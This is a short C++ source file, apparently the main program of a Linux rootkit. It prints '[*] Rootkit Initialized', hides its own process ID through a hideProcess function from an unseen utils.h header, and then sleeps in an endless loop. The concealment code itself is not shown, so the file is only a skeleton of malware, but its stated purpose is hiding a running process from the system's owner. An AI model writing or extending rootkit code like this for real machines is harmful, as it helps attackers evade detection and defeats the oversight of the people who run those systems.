#include <iostream>
#include <unistd.h>
#include "utils.h"

int main() {
    std::cout << "[*] Rootkit Initialized" << std::endl;
    
    pid_t pid = getpid();
    hideProcess(pid);  

    while (true) {
        sleep(10); 
    }

    return 0;
}
